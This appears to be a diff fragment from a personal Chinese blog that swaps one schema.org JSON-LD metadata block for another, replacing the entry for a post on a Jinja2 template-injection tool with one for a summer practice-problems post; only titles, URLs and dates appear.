-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","sameAs":["https://github.com/volantis-x"],"description":"yixinBC的个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://yixinbc.tech/","name":"yixinBC's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://yixinbc.tech/2023/05/11/fenjing/","name":"fenjing(焚靖)——jinja2 SSTI一把梭"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"yixinBC's blog","url":"https://yixinbc.tech/","keywords":null,"description":"yixinBC的个人博客","author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","description":"yixinBC的个人博客"},"publisher":{"@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://yixinbc.tech?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"fenjing(焚靖)——jinja2 SSTI一把梭","description":"yixinBC的个人博客","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://yixinbc.tech/2023/05/11/fenjing/"},"author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/"},"publisher":{"@type":"Organization","name":"yixinBC's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://yixinbc.tech/2023/05/11/fenjing/","wordCount":0,"datePublished":"2023-05-11T18:36:24.000Z","dateModified":"2023-07-13T12:20:11.760Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","sameAs":["https://github.com/volantis-x"],"description":"yixinBC的个人博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://yixinbc.tech/","name":"yixinBC's blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://yixinbc.tech/2023/07/13/暑期第一周刷题/","name":"暑期第一周刷题"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"yixinBC's blog","url":"https://yixinbc.tech/","keywords":null,"description":"yixinBC的个人博客","author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/","description":"yixinBC的个人博客"},"publisher":{"@type":"Organization","name":"yixinBC's blog","url":"https://yixinbc.tech/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://yixinbc.tech?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"暑期第一周刷题","description":"yixinBC的个人博客","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/"},"author":{"@type":"Person","name":"yixinBC","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://yixinbc.tech/"},"publisher":{"@type":"Organization","name":"yixinBC's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/","wordCount":0,"datePublished":"2023-07-13T20:14:37.000Z","dateModified":"2023-07-13T12:20:11.764Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
